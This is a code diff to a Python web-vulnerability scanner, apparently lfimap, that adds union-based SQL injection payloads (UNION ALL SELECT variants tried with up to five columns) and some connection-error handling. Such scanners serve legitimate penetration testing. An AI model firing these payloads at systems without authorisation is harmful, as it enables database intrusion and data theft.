@@ -19,6 +19,7 @@ import traceback
 import errno
 import fileinput
 import urllib.parse as urlparse
+import urllib3
 
 from contextlib import closing
 from argparse import RawTextHelpFormatter
@@ -657,6 +658,40 @@ def test_heuristics(url):
     return
 
 def test_sqli(url):
+
+    if(args.verbose):
+        print("[i] Testing with union-based SQL injection up to 5 columns...")
+    
+    pyldList = []
+    pyldList.append("1337 UNION ALL SELECT INJECT")
+    pyldList.append("1337\" UNION ALL SELECT INJECT-- -")
+    pyldList.append("1337' UNION ALL SELECT INJECT-- -")
+    pyldList.append("1337' UNION ALL SELECT INJECT#")
+    pyldList.append("1337)' UNION ALL SELECT INJECT-- -")
+    pyldList.append("1337)\" UNION ALL SELECT INJECT-- -")
+
+    toInject = 'concat(0x6c66696d61702d696e6a65637465642d737472696e67)'
+    for p in pyldList:
+        # Test up to 5 columns, this will generate at most 45 requests for union-based sqli test.
+        for i in range(5):
+            if(i == 0): 
+                pyld = p.replace("INJECT", toInject)
+                ltrInject = ',' + toInject
+            else: pyld = p.replace("INJECT", toInject + (ltrInject*i))
+            
+            if(args.postreq): req, br = POST(url, headers, args.postreq.replace(args.param,pyld), proxies, "SQLI", "SQLI")
+            else: req, br = GET(url.replace(args.param,pyld), headers, proxies, "SQLI", "SQLI")
+            
+            if("lfimap-injected-string" in req.text.lower()):
+                if(args.postreq): print("[+] SQLI with " + str(i+1) + " columns -> " + url + " HTTP POST -> " + args.postreq.replace(args.param,pyld))
+                else: print("[+] SQLI with " + str(i+1)+ " columns -> " + url.replace(args.param,pyld))
+                
+                # If '--no-stop' is set, then union based sqli is stopped, because none of the following payloads will be valid
+                # because number of columns won't match. Break out of the loop, and test for blind sql injection.
+                if(not args.no_stop): return
+                else: break
+
+    #-----------------------------------------------------
     if(args.verbose):
         print("[i] Testing for blind SQL injection...")
     
@@ -732,8 +767,6 @@ def test_sqli(url):
                 stats["vulns"] += 1
                 if(not args.no_stop):
                     return
-
-    #TODO union based sql injections
 
 
 #Checks if sent payload is executed, if any of the below keywords are in the response, returns True
@@ -1342,6 +1375,8 @@ def main():
                             stats["vulns"] += 1
                             continue
                 
+                except ConnectionRefusedError:
+                    print("[-] Failed to establish connection to " + args.url)
                 except requests.exceptions.ConnectTimeout:
                     print("[-] Url '" + line + "' timed out. Skipping...")
                     continue
@@ -1515,7 +1550,8 @@ def main():
         #HEAD request timed out
         except requests.exceptions.ConnectTimeout:
             print("[-] Url '" + args.url + "' timed out. Skipping...")
-        
+        except ConnectionRefusedError:
+            print("[-] Failed to establish connection to " + args.url)
         except urllib3.exceptions.NewConnectionError:
             print("[-] Failed to establish connection to " + args.url)
         except OSError:
@@ -1746,3 +1782,4 @@ if(__name__ == "__main__"):
                 addHeader(args.httpheaders[i].split(":",1)[0].replace(" ",""), args.httpheaders[i].split(":",1)[1].replace(" ", ""))
     main()
 
+┌
